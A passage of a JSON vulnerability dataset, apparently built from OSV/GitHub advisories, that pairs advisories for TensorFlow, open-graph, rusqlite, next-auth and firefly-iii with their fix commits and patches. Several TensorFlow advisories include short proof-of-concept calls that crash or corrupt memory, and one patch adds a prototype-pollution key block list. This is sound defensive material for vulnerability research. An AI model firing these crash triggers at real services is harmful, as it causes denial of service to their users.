'https:\/\/github.com\/ua-parser\/uap-core\/raw\/010ccdc7303546cd22b9da687c29f4a996990014\/package.json', 'patch': '@@ -1,7 +1,7 @@\\n {\\n   \"name\": \"uap-core\",\\n   \"description\": \"The regex file necessary to build language ports of Browserscope\\'s user agent parser.\",\\n-  \"version\": \"0.5.0\",\\n+  \"version\": \"0.6.0\",\\n   \"maintainers\": [\\n     {\\n       \"name\": \"Tobie Langel\",'}}","message_norm":"0.6.0","language":"","entities":"[('0.6.0', 'VERSION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['package.json'])","num_files":1.0},{"index":1798,"vuln_id":"GHSA-fxqh-cfjm-fp93","cwe_id":"{'CWE-369'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4071d8e2f6c45c1955a811fee757ca2adbe462c1'}","dataset":"osv","summary":"Division by 0 in `Reverse` ### Impact\nAn attacker can cause a denial of service via a FPE runtime error in `tf.raw_ops.Reverse`:\n\n```python\nimport tensorflow as tf\n\ntensor_input = tf.constant([], shape=[0, 1, 1], dtype=tf.int32)\ndims = tf.constant([False, True, False], shape=[3], dtype=tf.bool)\n\ntf.raw_ops.Reverse(tensor=tensor_input, dims=dims)\n``` \n    \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/36229ea9e9451dac14a8b1f4711c435a1d84a594\/tensorflow\/core\/kernels\/reverse_op.cc#L75-L76) performs a division based on the first dimension of the tensor argument:\n    \n```cc\nconst int64 N = input.dim_size(0);\nconst int64 cost_per_unit = input.NumElements() \/ N;\n```\n\nSince this is controlled by the user, an attacker can trigger a denial of service.\n\n### Patches\nWe have patched the issue in GitHub commit [4071d8e2f6c45c1955a811fee757ca2adbe462c1](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4071d8e2f6c45c1955a811fee757ca2adbe462c1).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4071d8e2f6c45c1955a811fee757ca2adbe462c1","commit_sha":"4071d8e2f6c45c1955a811fee757ca2adbe462c1","patch":"SINGLE","chain_ord":"['4071d8e2f6c45c1955a811fee757ca2adbe462c1']","before_first_fix_commit":"{'36229ea9e9451dac14a8b1f4711c435a1d84a594'}","last_fix_commit":"4071d8e2f6c45c1955a811fee757ca2adbe462c1","chain_ord_pos":1.0,"commit_datetime":"04\/29\/2021, 19:24:18","message":"Fix FPE issue with `tf.raw_ops.Reverse`.\n\nPiperOrigin-RevId: 371176973\nChange-Id: Ic6d483bfc95313ec2299c2d1c956cfe96c96626c","author":"Amit Patankar","comments":null,"stats":"{'additions': 6, 'deletions': 0, 'total': 6}","files":"{'tensorflow\/core\/kernels\/reverse_op.cc': {'additions': 6, 'deletions': 0, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4071d8e2f6c45c1955a811fee757ca2adbe462c1\/tensorflow%2Fcore%2Fkernels%2Freverse_op.cc', 'patch': '@@ -155,6 +155,12 @@ class ReverseOp : public OpKernel {\\n \\n   void Compute(OpKernelContext* context) override {\\n     const Tensor& input = context->input(0);\\n+    \/\/ If input is provided, check to make sure the first dimension is valid.\\n+    if (input.dims() > 0) {\\n+      OP_REQUIRES(\\n+          context, input.dim_size(0) != 0,\\n+          errors::InvalidArgument(\"Invalid input first dimension. Found 0.\"));\\n+    }\\n     const Tensor& dims = context->input(1);\\n \\n     if (TensorShapeUtils::IsScalar(input.shape())) {'}}","message_norm":"fix fpe issue with `tf.raw_ops.reverse`.\n\npiperorigin-revid: 371176973\nchange-id: ic6d483bfc95313ec2299c2d1c956cfe96c96626c","language":"en","entities":"[('fix', 'ACTION', ''), ('fpe', 'SECWORD', ''), ('issue', 'FLAW', ''), ('371176973', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/reverse_op.cc'])","num_files":1.0},{"index":1802,"vuln_id":"GHSA-g25h-jr74-qp5j","cwe_id":"{'CWE-20'}","score":7.8,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6da6620efad397c85493b8f8667b821403516708'}","dataset":"osv","summary":"Incomplete validation in `QuantizeV2` ### Impact                                                                                                                                                                                                                                                                                \nDue to incomplete validation in `tf.raw_ops.QuantizeV2`, an attacker can trigger undefined behavior via binding a reference to a null pointer or can access data outside the bounds of heap allocated arrays:\n\n```python\nimport tensorflow as tf\n\ntf.raw_ops.QuantizeV2(\n  input=[1,2,3],\n  min_range=[1,2],\n  max_range=[],\n  T=tf.qint32,\n  mode='SCALED',\n  round_mode='HALF_AWAY_FROM_ZERO',\n  narrow_range=False,\n  axis=1,\n  ensure_minimum_range=3)\n```\n\nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/84d053187cb80d975ef2b9684d4b61981bca0c41\/tensorflow\/core\/kernels\/quantize_op.cc#L59) has some validation but does not check that `min_range` and `max_range` both have the same non-zero number of elements. If `axis` is provided (i.e., not `-1`), then validation should check that it is a value in range for the rank of `input` tensor and then the lengths of `min_range` and `max_range` inputs match the `axis` dimension of the `input` tensor.\n  \n### Patches\nWe have patched the issue in GitHub commit [6da6620efad397c85493b8f8667b821403516708](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6da6620efad397c85493b8f8667b821403516708).\n  \nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/6da6620efad397c85493b8f8667b821403516708","commit_sha":"6da6620efad397c85493b8f8667b821403516708","patch":"SINGLE","chain_ord":"['6da6620efad397c85493b8f8667b821403516708']","before_first_fix_commit":"{'eb921122119a6b6e470ee98b89e65d721663179d'}","last_fix_commit":"6da6620efad397c85493b8f8667b821403516708","chain_ord_pos":1.0,"commit_datetime":"07\/28\/2021, 00:19:57","message":"Secure tf.raw_ops.QuantizeV2\n\nValidate size and shape of min_range and max_range\nEnsure axis is within input dims limits\n\nPiperOrigin-RevId: 387232799\nChange-Id: I36975281f7b5758e9e31a8dcc73fe610ef456318","author":"Laura Pak","comments":null,"stats":"{'additions': 43, 'deletions': 0, 'total': 43}","files":"{'tensorflow\/core\/kernels\/quantize_op.cc': {'additions': 43, 'deletions': 0, 'changes': 43, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/6da6620efad397c85493b8f8667b821403516708\/tensorflow%2Fcore%2Fkernels%2Fquantize_op.cc', 'patch': '@@ -113,7 +113,50 @@ class QuantizeV2Op : public OpKernel {\\n \\n     int num_slices = 1;\\n     if (axis_ > -1) {\\n+      OP_REQUIRES(\\n+          ctx, input.dims() > axis_,\\n+          errors::InvalidArgument(\\n+              \"Axis is on a zero-based index, so its value must always be less \"\\n+              \"than number of input\\'s dims, but given axis value was \",\\n+              axis_, \" and input\\'s dims was \", input.dims()));\\n       num_slices = input.dim_size(axis_);\\n+      OP_REQUIRES(ctx, input_min_range.dims() == 1,\\n+                  errors::InvalidArgument(\\n+                      \"If axis is specified, min_range must be a 1-D tensor \"\\n+                      \"whose size matches the axis dimension of the input and \"\\n+                      \"output tensors, but min_range dims are \",\\n+                      input_min_range.dims()));\\n+      OP_REQUIRES(ctx, input_min_range.dim_size(0) == num_slices,\\n+                  errors::InvalidArgument(\\n+                      \"If axis is specified, min_range must be a 1-D tensor \"\\n+                      \"whose size matches the axis dimension of the input and \"\\n+                      \"output tensors, but min_range is a 1-D tensor of size \",\\n+                      input_min_range.dim_size(0),\\n+                      \" and input\\'s axis dimension is of size \", num_slices));\\n+      OP_REQUIRES(ctx, input_max_range.dims() == 1,\\n+                  errors::InvalidArgument(\\n+                      \"If axis is specified, max_range must be a 1-D tensor \"\\n+                      \"whose size matches the axis dimension of the input and \"\\n+                      \"output tensors, but max_range dims are \",\\n+                      input_max_range.dims()));\\n+      OP_REQUIRES(ctx, input_max_range.dim_size(0) == num_slices,\\n+                  errors::InvalidArgument(\\n+                      \"If axis is specified, max_range must be a 1-D tensor \"\\n+                      \"whose size matches the axis dimension of the input and \"\\n+                      \"output tensors, but max_range is a 1-D tensor of size \",\\n+                      input_max_range.dim_size(0),\\n+                      \" and input\\'s axis dimension is of size \", num_slices));\\n+    } else {\\n+      OP_REQUIRES(ctx, input_min_range.NumElements() == 1,\\n+                  errors::InvalidArgument(\\n+                      \"If axis is not specified, min_range must contain a \"\\n+                      \"single float element, but it contains \",\\n+                      input_min_range.NumElements(), \" elements\"));\\n+      OP_REQUIRES(ctx, input_max_range.NumElements() == 1,\\n+                  errors::InvalidArgument(\\n+                      \"If axis is not specified, max_range must contain a \"\\n+                      \"single float element, but it contains \",\\n+                      input_max_range.NumElements(), \" elements\"));\\n     }\\n \\n     const TensorShape& minmax_shape = ctx->input(1).shape();'}}","message_norm":"secure tf.raw_ops.quantizev2\n\nvalidate size and shape of min_range and max_range\nensure axis is within input dims limits\n\npiperorigin-revid: 387232799\nchange-id: i36975281f7b5758e9e31a8dcc73fe610ef456318","language":"en","entities":"[('secure', 'SECWORD', ''), ('validate', 'ACTION', ''), ('ensure', 'ACTION', ''), ('387232799', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantize_op.cc'])","num_files":1.0},{"index":1809,"vuln_id":"GHSA-g452-6rfc-vrvx","cwe_id":"{'CWE-915'}","score":5.3,"chain":"{'https:\/\/github.com\/samholmes\/node-open-graph\/commit\/a0cef507a90adaac7dbbe9c404f09a50bdefb348'}","dataset":"osv","summary":"Prototype Pollution in open-graph This affects the package open-graph before 0.2.6. The function parse could be tricked into adding or modifying properties of Object.prototype using a __proto__ or constructor payload.","published_date":"2021-09-01","chain_len":1,"project":"https:\/\/github.com\/samholmes\/node-open-graph","commit_href":"https:\/\/github.com\/samholmes\/node-open-graph\/commit\/a0cef507a90adaac7dbbe9c404f09a50bdefb348","commit_sha":"a0cef507a90adaac7dbbe9c404f09a50bdefb348","patch":"SINGLE","chain_ord":"['a0cef507a90adaac7dbbe9c404f09a50bdefb348']","before_first_fix_commit":"{'ef532ed1c51be12155bc1f9baecad09a7c587e04'}","last_fix_commit":"a0cef507a90adaac7dbbe9c404f09a50bdefb348","chain_ord_pos":1.0,"commit_datetime":"08\/03\/2021, 16:31:10","message":"Patch: Filter out blacklisted keys in og property name","author":"Samuel Holmes","comments":null,"stats":"{'additions': 7, 'deletions': 0, 'total': 7}","files":"{'index.js': {'additions': 7, 'deletions': 0, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/samholmes\/node-open-graph\/raw\/a0cef507a90adaac7dbbe9c404f09a50bdefb348\/index.js', 'patch': '@@ -10,6 +10,11 @@ var shorthandProperties = {\\n \\t\"audio\": \"audio:url\"\\n }\\n \\n+var keyBlacklist = [\\n+\\t\\'__proto__\\',\\n+\\t\\'constructor\\',\\n+\\t\\'prototype\\'\\n+]\\n \\n exports = module.exports = function(url, cb, options){\\n   var userAgent = (options || {}).userAgent || \\'NodeOpenGraphCrawler (https:\/\/github.com\/samholmes\/node-open-graph)\\'\\n@@ -122,6 +127,8 @@ exports.parse = function($, options){\\n \\t\\twhile (keys.length > 1) {\\n \\t\\t\\tkey = keys.shift();\\n \\n+\\t\\t\\tif (keyBlacklist.includes(key)) continue\\n+\\n \\t\\t\\tif (Array.isArray(ptr[key])) {\\n \\t\\t\\t\\t\/\/ the last index of ptr[key] should become\\n \\t\\t\\t\\t\/\/ the object we are examining.'}}","message_norm":"patch: filter out blacklisted keys in og property name","language":"en","entities":"[('blacklisted', 'SECWORD', ''), ('keys', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['index.js'])","num_files":1.0},{"index":1813,"vuln_id":"GHSA-g4h2-gqm3-c9wq","cwe_id":"{'CWE-681'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4f663d4b8f0bec1b48da6fa091a7d29609980fa4'}","dataset":"osv","summary":"Segfault in tf.raw_ops.ImmutableConst ### Impact\nCalling [`tf.raw_ops.ImmutableConst`](https:\/\/www.tensorflow.org\/api_docs\/python\/tf\/raw_ops\/ImmutableConst) with a `dtype` of `tf.resource` or `tf.variant` results in a segfault in the implementation as code assumes that the tensor contents are pure scalars.\n\n```python\n>>> import tensorflow as tf\n>>> tf.raw_ops.ImmutableConst(dtype=tf.resource, shape=[], memory_region_name=\"\/tmp\/test.txt\")\n...\nSegmentation fault\n```\n\n### Patches\nWe have patched the issue in 4f663d4b8f0bec1b48da6fa091a7d29609980fa4 and will release TensorFlow 2.5.0 containing the patch. TensorFlow nightly packages after this commit will also have the issue resolved.\n\n### Workarounds\nIf using `tf.raw_ops.ImmutableConst` in code, you can prevent the segfault by inserting a filter for the `dtype` argument.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/4f663d4b8f0bec1b48da6fa091a7d29609980fa4","commit_sha":"4f663d4b8f0bec1b48da6fa091a7d29609980fa4","patch":"SINGLE","chain_ord":"['4f663d4b8f0bec1b48da6fa091a7d29609980fa4']","before_first_fix_commit":"{'f0e867da82025a97524a233eaedfccfcf6295d5c'}","last_fix_commit":"4f663d4b8f0bec1b48da6fa091a7d29609980fa4","chain_ord_pos":1.0,"commit_datetime":"02\/08\/2021, 20:29:30","message":"Allowlist certain data types to avoid a seg fault.\n\nPiperOrigin-RevId: 356326671\nChange-Id: I23b65b52e93798cb5a6744632d31b0f88c6b6b31","author":"Amit Patankar","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/immutable_constant_op.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/4f663d4b8f0bec1b48da6fa091a7d29609980fa4\/tensorflow%2Fcore%2Fkernels%2Fimmutable_constant_op.cc', 'patch': '@@ -17,6 +17,8 @@ limitations under the License.\\n \\n #include <unordered_set>\\n \\n+#include \"tensorflow\/core\/framework\/types.pb.h\"\\n+\\n namespace tensorflow {\\n \\n namespace {\\n@@ -86,6 +88,9 @@ ImmutableConstantOp::ImmutableConstantOp(OpKernelConstruction* context)\\n   OP_REQUIRES_OK(context,\\n                  context->GetAttr(kMemoryRegionNameAttr, &region_name_));\\n   OP_REQUIRES_OK(context, context->GetAttr(kDTypeAttr, &dtype_));\\n+  OP_REQUIRES(context, dtype_ != DT_RESOURCE && dtype_ != DT_VARIANT,\\n+              errors::InvalidArgument(\\n+                  \"Resource and variant dtypes are invalid for this op.\"));\\n   OP_REQUIRES_OK(context, context->GetAttr(kShapeAttr, &shape_));\\n }'}}","message_norm":"allowlist certain data types to avoid a seg fault.\n\npiperorigin-revid: 356326671\nchange-id: i23b65b52e93798cb5a6744632d31b0f88c6b6b31","language":"en","entities":"[('fault', 'FLAW', ''), ('356326671', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/immutable_constant_op.cc'])","num_files":1.0},{"index":1817,"vuln_id":"GHSA-g4w7-3qr8-5623","cwe_id":"{'CWE-351'}","score":9.8,"chain":"{'https:\/\/github.com\/rusqlite\/rusqlite\/commit\/71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0'}","dataset":"osv","summary":"Improper type usage in rusqlite An issue was discovered in the rusqlite crate before 0.23.0 for Rust. Memory safety can be violated via the repr(Rust) type.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/rusqlite\/rusqlite","commit_href":"https:\/\/github.com\/rusqlite\/rusqlite\/commit\/71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0","commit_sha":"71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0","patch":"SINGLE","chain_ord":"['71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0']","before_first_fix_commit":"{'38aea89809ea4154975d853bffe3cb7715fe84d6'}","last_fix_commit":"71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0","chain_ord_pos":1.0,"commit_datetime":"04\/12\/2020, 18:17:56","message":"Ensure type use for auxdata is repr(C)","author":"Thom Chiovoloni","comments":null,"stats":"{'additions': 16, 'deletions': 6, 'total': 22}","files":"{'src\/functions.rs': {'additions': 16, 'deletions': 6, 'changes': 22, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/rusqlite\/rusqlite\/raw\/71b2f5187b0cbace3f8b6ff53432ff2ca0defcf0\/src%2Ffunctions.rs', 'patch': '@@ -67,6 +67,7 @@\\n \/\/!     Ok(())\\n \/\/! }\\n \/\/! ```\\n+use std::any::TypeId;\\n use std::os::raw::{c_int, c_void};\\n use std::panic::{catch_unwind, RefUnwindSafe, UnwindSafe};\\n use std::ptr;\\n@@ -177,13 +178,16 @@ impl Context<\\'_> {\\n     \/\/\/ https:\/\/www.sqlite.org\/c3ref\/get_auxdata.html for a discussion of\\n     \/\/\/ this feature, or the unit tests of this module for an example.\\n     pub fn set_aux<T: \\'static>(&self, arg: c_int, value: T) {\\n-        let boxed = Box::into_raw(Box::new((std::any::TypeId::of::<T>(), value)));\\n+        let boxed = Box::into_raw(Box::new(AuxData {\\n+            id: TypeId::of::<T>(),\\n+            value,\\n+        }));\\n         unsafe {\\n             ffi::sqlite3_set_auxdata(\\n                 self.ctx,\\n                 arg,\\n                 boxed as *mut c_void,\\n-                Some(free_boxed_value::<(std::any::TypeId, T)>),\\n+                Some(free_boxed_value::<AuxData<T>>),\\n             )\\n         };\\n     }\\n@@ -192,20 +196,26 @@ impl Context<\\'_> {\\n     \/\/\/ via `set_aux`. Returns `Ok(None)` if no data has been associated,\\n     \/\/\/ and .\\n     pub fn get_aux<T: \\'static>(&self, arg: c_int) -> Result<Option<&T>> {\\n-        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *mut (std::any::TypeId, T) };\\n+        let p = unsafe { ffi::sqlite3_get_auxdata(self.ctx, arg) as *const AuxData<T> };\\n         if p.is_null() {\\n             Ok(None)\\n         } else {\\n-            let id_val = unsafe { &*p };\\n-            if std::any::TypeId::of::<T>() != id_val.0 {\\n+            let id = unsafe { (*p).id };\\n+            if TypeId::of::<T>() != id {\\n                 Err(Error::GetAuxWrongType)\\n             } else {\\n-                Ok(Some(&id_val.1))\\n+                Ok(Some(unsafe { &(*p).value }))\\n             }\\n         }\\n     }\\n }\\n \\n+#[repr(C)]\\n+struct AuxData<T: \\'static> {\\n+    id: TypeId,\\n+    value: T,\\n+}\\n+\\n \/\/\/ `feature = \"functions\"` Aggregate is the callback interface for user-defined\\n \/\/\/ aggregate function.\\n \/\/\/'}}","message_norm":"ensure type use for auxdata is repr(c)","language":"fr","entities":"[('ensure', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/functions.rs'])","num_files":1.0},{"index":1821,"vuln_id":"GHSA-g5fm-jp9v-2432","cwe_id":"{'CWE-754'}","score":7.5,"chain":"{'https:\/\/github.com\/nextauthjs\/next-auth\/commit\/e498483b23273d1bfc81be68339607f88d411bd6', 'https:\/\/github.com\/nextauthjs\/next-auth\/commit\/25517b73153332d948114bacdff3b5908de91d85'}","dataset":"osv","summary":"Improper Handling of `callbackUrl` parameter in next-auth ### Impact\n\nAn attacker can send a request to an app using NextAuth.js with an invalid `callbackUrl` query parameter, which internally we convert to a `URL` object. The URL instantiation would fail due to a malformed URL being passed into the constructor, causing it to throw an unhandled error which led to our **API route handler timing out and logging in to fail**. This has been remedied in the following releases:\n\nnext-auth v3 users before version 3.29.5 are impacted. (We recommend upgrading to v4, as v3 is considered unmaintained. See our [migration guide](https:\/\/next-auth.js.org\/getting-started\/upgrade-v4))\n\nnext-auth v4 users before version 4.5.0 are impacted.\n\n### Patches\n\nWe've released patches for this vulnerability in:\n  \n- v3 - `3.29.5`\n- v4 - `4.5.0`\n\nYou can do:\n\n```sh\nnpm i next-auth@latest\n```\n\nor\n\n```sh\nyarn add next-auth@latest\n```\n\nor\n\n```sh\npnpm add next-auth@latest\n```\n\n(This will update to the latest v4 version, but you can change  `latest` to `3` if you want to stay on v3. This is not recommended.)\n\n### Workarounds\n\nIf for some reason you cannot upgrade, the workaround requires you to rely on [Advanced Initialization](https:\/\/next-auth.js.org\/configuration\/initialization#advanced-initialization). Here is an example:\n\n**Before:**\n\n```js\n\/\/ pages\/api\/auth\/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nexport default NextAuth(\/* your config *\/)\n```\n\n**After:**\n\n```js\n\/\/ pages\/api\/auth\/[...nextauth].js\nimport NextAuth from \"next-auth\"\n\nfunction isValidHttpUrl(url) {\n  try {\n    return \/^https?:\/.test(url).protocol\n  } catch {\n    return false;\n  }\n}\n\nexport default async function handler(req, res) {\n  if (\n    req.query.callbackUrl &&\n    !isValidHttpUrl(req.query.callbackUrl)\n  ) {\n   return res.status(500).send('');\n  }\n  \n  return await NextAuth(req, res, \/* your config *\/)\n}\n```\n\n\n### References\n\nThis vulnerability was discovered not long after https:\/\/github.com\/nextauthjs\/next-auth\/security\/advisories\/GHSA-q2mx-j4x2-2h74 was published and is very similar in nature.\n\nRelated documentation:\n\n- https:\/\/next-auth.js.org\/getting-started\/client#specifying-a-callbackurl\n- https:\/\/next-auth.js.org\/configuration\/callbacks#redirect-callback\n\nA test case has been added so this kind of issue will be checked before publishing. See: https:\/\/github.com\/nextauthjs\/next-auth\/commit\/e498483b23273d1bfc81be68339607f88d411bd6\n\n### For more information\n\nIf you have any concerns, we request responsible disclosure, outlined here: https:\/\/next-auth.js.org\/security#reporting-a-vulnerability\n\n### Timeline\n\nThe issue was reported 2022 June 10th, a response was sent out to the reporter in less than 2 hours, and a patch was published within 3 hours.","published_date":"2022-06-21","chain_len":2,"project":"https:\/\/github.com\/nextauthjs\/next-auth","commit_href":"https:\/\/github.com\/nextauthjs\/next-auth\/commit\/e498483b23273d1bfc81be68339607f88d411bd6","commit_sha":"e498483b23273d1bfc81be68339607f88d411bd6","patch":"MULTI","chain_ord":"['25517b73153332d948114bacdff3b5908de91d85', 'e498483b23273d1bfc81be68339607f88d411bd6']","before_first_fix_commit":"{'7cf49566a6327ae99a3def6d20b28c3786c7368c'}","last_fix_commit":"e498483b23273d1bfc81be68339607f88d411bd6","chain_ord_pos":2.0,"commit_datetime":"06\/20\/2022, 08:38:21","message":"test: add test for invalid `callbackUrl` handling","author":"Bal\u00e1zs Orb\u00e1n","comments":null,"stats":"{'additions': 16, 'deletions': 0, 'total': 16}","files":"{'packages\/next-auth\/tests\/assert.test.ts': {'additions': 16, 'deletions': 0, 'changes': 16, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/nextauthjs\/next-auth\/raw\/e498483b23273d1bfc81be68339607f88d411bd6\/packages%2Fnext-auth%2Ftests%2Fassert.test.ts', 'patch': '@@ -13,6 +13,22 @@ it(\"Show error page if secret is not defined\", async () => {\\n   expect(log.error).toBeCalledWith(\"NO_SECRET\", expect.anything())\\n })\\n \\n+it(\"Should show configuration error page on invalid `callbackUrl`\", async () => {\\n+  const { res, log } = await handler(\\n+    { providers: [] },\\n+    { prod: true, params: { callbackUrl: \"invalid-callback\" } }\\n+  )\\n+\\n+  expect(res.status).toBe(500)\\n+  expect(res.html).toMatch(\/there is a problem with the server configuration.\/i)\\n+  expect(res.html).toMatch(\/check the server logs for more information.\/i)\\n+\\n+  expect(log.error).toBeCalledWith(\\n+    \"INVALID_CALLBACK_URL_ERROR\",\\n+    expect.anything()\\n+  )\\n+})\\n+\\n it(\"Allow relative `callbackUrl`\", async () => {\\n   const { res, log } = await handler(\\n     { providers: [] },'}}","message_norm":"test: add test for invalid `callbackurl` handling","language":"en","entities":"[('add', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/next-auth\/tests\/assert.test.ts'])","num_files":1.0},{"index":1832,"vuln_id":"GHSA-g6vq-wc8w-4g69","cwe_id":"{'CWE-352'}","score":4.3,"chain":"{'https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/518b4ba5a7a56760902758ae0a2c6a392c2f4d37'}","dataset":"osv","summary":"firefly-iii is vulnerable to Cross-Site Request Forgery (CSRF) firefly-iii is vulnerable to Cross-Site Request Forgery (CSRF).","published_date":"2021-12-06","chain_len":1,"project":"https:\/\/github.com\/firefly-iii\/firefly-iii","commit_href":"https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/518b4ba5a7a56760902758ae0a2c6a392c2f4d37","commit_sha":"518b4ba5a7a56760902758ae0a2c6a392c2f4d37","patch":"SINGLE","chain_ord":"['518b4ba5a7a56760902758ae0a2c6a392c2f4d37']","before_first_fix_commit":"{'0f9c1b9427b946b5eb580112edfcb3ed6a812970'}","last_fix_commit":"518b4ba5a7a56760902758ae0a2c6a392c2f4d37","chain_ord_pos":1.0,"commit_datetime":"11\/24\/2021, 18:22:07","message":"Fix CSRF issues","author":"James Cole","comments":null,"stats":"{'additions': 6, 'deletions': 5, 'total': 11}","files":"{'routes\/web.php': {'additions': 6, 'deletions': 5, 'changes': 11, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/firefly-iii\/firefly-iii\/raw\/518b4ba5a7a56760902758ae0a2c6a392c2f4d37\/routes%2Fweb.php', 'patch': \"@@ -213,7 +213,7 @@ static function () {\\n     ['middleware' => 'user-full-auth', 'namespace' => 'FireflyIII\\\\Http\\\\Controllers', 'prefix' => 'subscriptions', 'as' => 'subscriptions.'],\\n     static function () {\\n         Route::get('', ['uses' => 'Bill\\\\IndexController@index', 'as' => 'index']);\\n-        Route::get('rescan\/{bill}', ['uses' => 'Bill\\\\ShowController@rescan', 'as' => 'rescan']);\\n+        Route::post('rescan\/{bill}', ['uses' => 'Bill\\\\ShowController@rescan', 'as' => 'rescan']);\\n         Route::get('create', ['uses' => 'Bill\\\\CreateController@create', 'as' => 'create']);\\n         Route::get('edit\/{bill}', ['uses' => 'Bill\\\\EditController@edit', 'as' => 'edit']);\\n         Route::get('delete\/{bill}', ['uses' => 'Bill\\\\DeleteController@delete', 'as' => 'delete']);\\n@@ -649,7 +649,7 @@ static function () {\\n         Route::get('rate\/{fromCurrencyCode}\/{toCurrencyCode}\/{date}', ['uses' => 'Json\\\\ExchangeController@getRate', 'as' => 'rate']);\\n \\n         \/\/ intro things:\\n-        Route::any('intro\/finished\/{route}\/{specificPage?}', ['uses' => 'Json\\\\IntroController@postFinished', 'as' => 'intro.finished']);\\n+        Route::post('intro\/finished\/{route}\/{specificPage?}', ['uses' => 'Json\\\\IntroController@postFinished', 'as' => 'intro.finished']);\\n         Route::post('intro\/enable\/{route}\/{specificPage?}', ['uses' => 'Json\\\\IntroController@postEnable', 'as' => 'intro.enable']);\\n         Route::get('intro\/{route}\/{specificPage?}', ['uses' => 'Json\\\\IntroController@getIntroSteps', 'as' => 'intro']);\\n     }\\n@@ -726,14 +726,15 @@ static function () {\\n         Route::post('enable2FA', ['uses' => 'ProfileController@enable2FA', 'as' => 'enable2FA']);\\n         Route::get('2fa\/code', ['uses' => 'ProfileController@code', 'as' => 'code']);\\n         Route::post('2fa\/code', ['uses' => 'ProfileController@postCode', 'as' => 'code.store']);\\n-        Route::get('\/delete-code', ['uses' => 'ProfileController@deleteCode', 'as' => 'delete-code']);\\n-        Route::get('2fa\/new-codes', ['uses' => 'ProfileController@newBackupCodes', 'as' => 'new-backup-codes']);\\n+        Route::post('\/delete-code', ['uses' => 'ProfileController@deleteCode', 'as' => 'delete-code']);\\n+        Route::post('2fa\/new-codes', ['uses' => 'ProfileController@newBackupCodes', 'as' => 'new-backup-codes']);\\n \\n     }\\n );\\n \\n \/**\\n  * Recurring Transactions Controller.\\n+ * \\n  *\/\\n Route::group(\\n     ['middleware' => 'user-full-auth', 'namespace' => 'FireflyIII\\\\Http\\\\Controllers', 'prefix' => 'recurring', 'as' => 'recurring.'],\\n@@ -1078,7 +1079,7 @@ static function () {\\n \/\/ See reference nr. 6\\n         Route::post('store\/{tj}', ['uses' => 'LinkController@store', 'as' => 'store']);\\n         Route::get('delete\/{journalLink}', ['uses' => 'LinkController@delete', 'as' => 'delete']);\\n-        Route::get('switch\/{journalLink}', ['uses' => 'LinkController@switchLink', 'as' => 'switch']);\\n+        Route::post('switch\/{journalLink}', ['uses' => 'LinkController@switchLink', 'as' => 'switch']);\\n \\n         Route::post('destroy\/{journalLink}', ['uses' => 'LinkController@destroy', 'as' => 'destroy']);\\n     }\"}}","message_norm":"fix csrf 